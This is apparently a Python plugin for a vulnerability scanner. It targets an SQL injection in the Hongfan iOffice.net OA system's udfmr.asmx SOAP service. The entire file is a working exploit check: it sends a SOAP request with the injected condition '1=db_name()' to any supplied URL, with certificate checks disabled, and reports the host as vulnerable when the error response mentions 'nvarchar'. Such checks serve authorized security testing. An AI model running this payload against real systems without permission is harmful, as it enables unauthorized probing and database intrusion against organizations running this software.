#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '红帆OA iOffice.net udfmr.asmx处存在SQL注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'text/xml; charset=utf-8',
      'SOAPAction': "http://tempuri.org/ioffice/udfmr/GetEmpSearch"
      }
  target = '/iOffice/prg/set/wss/udfmr.asmx'
  data = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
      <condition>1=db_name()</condition>
    </GetEmpSearch>
  </soap:Body>
</soap:Envelope>
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if 'nvarchar' in res.text:
      ret['ifbug'] = True
      # ret['huixian'] = res.text
      res.close()
      return ret
    else:
      return ret
  except:
    return ret